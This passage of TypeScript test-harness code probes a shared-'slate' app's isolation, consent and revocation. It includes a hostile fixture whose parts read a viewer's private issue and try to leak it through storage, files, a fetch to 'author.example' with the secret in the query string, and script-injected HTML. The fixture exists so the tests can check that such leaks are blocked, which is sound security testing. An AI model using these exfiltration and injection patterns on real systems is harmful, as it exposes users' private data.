    return { actors, afterShare: this.actorCalls, refused: answered.ok ? JSON.stringify(answered.value) : answered.error, running };
  }

  async viewerBatch(handle: string, claim: ShareViewerClaim): Promise<{ probe: string | null; mutateError: string }> {
    const stub = slateBatchStub<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(
      { request: (request) => this.host.routeShare(handle, claim, request, '/__rpc') }, 'ignored',
    );

    const [raw, mutateError] = await Promise.all([
      stub.probe(),
      refusedText(stub.mutate()),
    ]);

    const probe = v.is(v.string(), raw) ? raw : JSON.stringify(raw ?? null);

    stub[Symbol.dispose]();

    return { probe, mutateError };
  }

  async viewerSocket(handle: string, claim: ShareViewerClaim): Promise<{ probe: string | null; mutateError: string }> {
    const response = await this.host.routeShare(
      handle, claim, new Request('https://share.invalid/__rpc', { headers: { Upgrade: 'websocket' } }), '/__rpc',
    );

    const socket = response.webSocket;

    if (socket === null) throw new Error(`upgrade refused: ${response.status}`);
    socket.accept();
    const stub = newWebSocketRpcSession<Record<string, (...args: JsonValue[]) => Promise<JsonValue>>>(socket);

    try {
      const raw = await stub.probe();
      const probe = v.is(v.string(), raw) ? raw : JSON.stringify(raw ?? null);
      const mutateError = await refusedText(stub.mutate());

      return { probe, mutateError };
    } finally {
      socket.close();
      // `release` reaches this DO over RPC: a tick so the audit row is settled before the test reads it.
      const { promise, resolve } = Promise.withResolvers<void>();
      setTimeout(resolve, 0);
      await promise;
    }
  }

  async replay(share: string): Promise<SlateSurfaceResult> {
    return this.host.surfaceCall(
      { ...ROOT_SLATE_CALLER, share }, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: this.lastCall },
    );
  }

  async requests(share: string): Promise<SlateCallResult> {
    return this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'viewerRequests', share });
  }

  async revoke(share: string): Promise<SlateCallResult> {
    return this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'unshare', share });
  }

  /** Whether every process a share started has stopped; the owner's own, from exercising the board, keep running. */
  async stopped(): Promise<boolean> {
    return this.processes.getRunning().length === this.ownersOwn;
  }

  /** The notes slate, its parts declared, shared with Alice and Bob; Carol has no share of it. */
  async startParts(): Promise<string> {
    const root = `/slates/${NOTES}`;
    const files = this.vfs.as(CRED_KERNEL);

    files.mkdir(root, { recursive: true });
    files.writeFile(`${root}/package.json`, JSON.stringify({
      name: NOTES, main: 'server.ts',
      slate: {
        title: 'Notes', runtime: 'worker',
        parts: {
          mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' }, two: { fn: 'two' },
          act: { fn: 'act', input: { kind: 'text', maxLength: 100 } },
        },
      },
    }));
    files.writeFile(`${root}/server.ts`, NOTES_SOURCE);
    await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });
    const shared = await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'share', id: NOTES, visibility: 'users', approved: [] });
    const share = v.parse(v.object({ ok: v.literal(true), value: v.object({ share: v.object({ id: v.string() }) }) }), shared).value.share.id;

    this.notesShare = share;

    this.host.controller.live.addUsers(share, ['alice', 'bob'].map(viewerNamed).map((viewer) => ({ userId: viewer.userId, email: viewer.email })));
    // Shared, it is built from its own tree: that build is the revision its viewers consent at.
    await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });

    return this.revision();
  }

  revision(): string {
    return slateRevision(this.host.controller.builds, NOTES) ?? '';
  }

  /** An edit of the notes slate: one more line, built again. */
  async editParts(): Promise<string> {
    this.vfs.as(CRED_KERNEL).writeFile(`/slates/${NOTES}/server.ts`, `${NOTES_SOURCE}\n// edited`);
    this.host.controller.filesChanged([`/slates/${NOTES}/server.ts`]);
    await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });

    return this.revision();
  }

  consent(viewer: string, consent: Omit<SlateConsent, 'workspace' | 'slate'>): void {
    this.accounts.consent(viewerNamed(viewer).email, { ...consent, workspace: this.ctx.id.name ?? this.ctx.id.toString(), slate: NOTES });
  }

  decide(viewer: string, id: string, approve: boolean): boolean {
    return this.accounts.decide(viewerNamed(viewer).email, id, approve);
  }

  dispatched(): string[] {
    return [...this.accounts.dispatched];
  }

  /** The notes share on the owner's access instead, at the revision it runs. */
  notesOnOwnerAccess(): void {
    const share = this.host.controller.live.live(this.notesShare);

    this.host.controller.live.setAuthority(share.id, { mode: 'owner', grantRevision: this.revision() }, share.grant);
  }

  /** The notes share revoked while the next connection call is out at its viewer's account. */
  revokeDuringNextCall(): void {
    this.accounts.duringNext = () => { this.host.controller.live.revoke(this.notesShare); };
  }

  async runPartApproved(viewer: string, part: string, approval: string): Promise<PartRunAnswer | null> {
    return await this.host.parts.run(viewerNamed(viewer), NOTES, part, { args: [], action: null, approval });
  }

  async runPart(viewer: string | null, part: string, args: JsonValue[] = [], action: PartRunRequest['action'] = null): Promise<PartRunAnswer | null> {
    return await this.host.parts.run(viewer === null ? null : viewerNamed(viewer), NOTES, part, { args, action, approval: null });
  }

  async showPart(viewer: 'alice' | 'bob', revision: string, value: JsonValue): Promise<SlateCallResult> {
    return await this.host.parts.show(viewerNamed(viewer), NOTES, 'mine', { revision, label: 'My issue', value });
  }

  async notesCall(method: string): Promise<SlateCallResult> {
    return await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method, args: [] });
  }

  /** A call as a part's process would make it after its run ended: the last run's own name, replayed. */
  async lateCall(): Promise<SlateSurfaceResult> {
    return await this.host.parts.call(NOTES, this.lastPartRun ?? crypto.randomUUID(), 'workspace', { path: ['mcp', 'GitHub', 'read_issue'], args: [{ owner: 'acme', repo: 'notes' }] });
  }

  /** Whether any row of this workspace's own storage holds `text`: every table, every column. */
  workspaceHolds(text: string): string[] {
    const sql = this.ctx.storage.sql;
    const tables = sql.exec<{ name: string }>(`SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE '_cf_%'`).toArray();

    return tables.flatMap(({ name }) => (JSON.stringify(sql.exec(`SELECT * FROM "${name}"`).toArray()).includes(text) ? [name] : []));
  }

  /** `PartBinding`'s way in: this probe is its workspace object. */
  async slatePartCall(slate: string, run: string, name: string, call: { readonly path: readonly string[]; readonly args: readonly JsonValue[] }): Promise<SlateSurfaceResult> {
    this.lastPartRun = run;

    return await this.host.parts.call(slate, run, name, call);
  }

  async slateCallAs(caller: SlateCaller, id: string, name: string, request: JsonValue): Promise<SlateSurfaceResult> {
    const parsed = v.safeParse(v.object({ invocation: v.nullable(v.string()) }), request);

    // The close listener releases with a null invocation; a replay must present the id the slate's call carried.
    if (parsed.success && parsed.output.invocation !== null) this.lastCall = parsed.output.invocation;

    return this.host.surfaceCall(caller, id, name, request);
  }
}

/** The slate whose personal parts the attacks run: each reads its viewer's private issue, then tries to get it out. */
const NOTES = 'notes';

/** People, as the app's route names them. */
const VIEWERS = new Map<string, PartViewer>([
  ['alice', { userId: 'u-alice', email: 'alice@probe.test', name: 'Alice' }],
  ['bob', { userId: 'u-bob', email: 'bob@probe.test', name: 'Bob' }],
  ['carol', { userId: 'u-carol', email: 'carol@probe.test', name: 'Carol' }],
]);

function viewerNamed(name: string): PartViewer {
  return VIEWERS.get(name) ?? { userId: `u-${name}`, email: `${name}@probe.test`, name };
}

const NOTES_SOURCE = [
  'import { SlateObject } from "kinu:slate";',
  // What a run left at module level: the next run of the image must never see it.
  'let kept = "none";',
  'const issue = (env) => env.workspace.mcp.GitHub.read_issue({ owner: "acme", repo: "notes" });',
  'const tried = (promise) => promise.then(() => "done", () => "refused");',
  'export class Slate extends SlateObject {',
  // Her issue, drawn with what a page script would do with it: none of it survives the cut.
  '  async mine() {',
  '    const read = await issue(this.env);',
  '    return { html: `<p onclick="steal()">${read.secret}</p><script>steal()</script><img src="https://author.example/i.png"><a href="https://author.example/">more</a>`,',
  '      actions: [{ id: "refresh", label: "Refresh" }], show: { label: "My issue", value: read.secret } };',
  '  }',
  // Every way out a part has but its viewer's own connections.
  '  async leaky() {',
  '    const read = await issue(this.env);',
  '    const ways = {',
  '      storage: await tried(this.storage.put("leak", read.secret)),',
  '      file: await tried(this.env.workspace.writeFile("/leak", read.secret)),',
  '      network: await tried(fetch("https://author.example/?d=" + read.secret)),',
  '      slates: await tried(this.env.workspace.slates.notes.board()),',
  '      browser: await tried(this.env.workspace.web.connectBrowser("kitesurf")),',
  '    };',
  '    this.sql.exec("CREATE TABLE IF NOT EXISTS kept (secret TEXT)");',
  '    this.sql.exec("INSERT INTO kept VALUES (?)", read.secret);',
  '    return { html: "<pre>" + JSON.stringify(ways) + "</pre>" };',
  '  }',
  // Her issue, read, then handed to a tool that may fetch any address: the author's, with her data in it.
  '  async egress() {',
  '    const read = await issue(this.env);',
  '    return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url: "https://author.example/?d=" + read.secret }) + "</p>" };',
  '  }',
  '  async stash() { const before = kept; kept = (await issue(this.env)).secret; return { html: "<p>" + before + "</p>" }; }',
  // Two calls that may each reach anywhere, one after the other: each waits on its own approval, and each runs once.
  '  async two() {',
  '    const first = await this.env.workspace.mcp.Fetch.get({ url: "https://a.example/" });',
  '    const second = await this.env.workspace.mcp.Fetch.get({ url: "https://b.example/" });',
  '    return { html: "<p>" + first + " then " + second + "</p>" };',
  '  }',
  '  async act(title) { await this.env.workspace.mcp.GitHub.create_issue({ owner: "acme", repo: "notes", title }); return { html: "<p>acted</p>" }; }',
  // The shared server: what was shown, and its own SQL, which no part ever wrote.
  '  async board() { return (await this.storage.get("shown")) ?? null; }',
  '  async showed(value, from) { await this.storage.put("shown", { value, by: from.email }); return "kept"; }',
  '  async serverKept() { return this.sql.exec("SELECT name FROM sqlite_master WHERE name = \'kept\'").toArray().length; }',
  '}',
].join('\n');

export default class SlateShareProbeWorker extends WorkerEntrypoint<Cloudflare.Env> {}


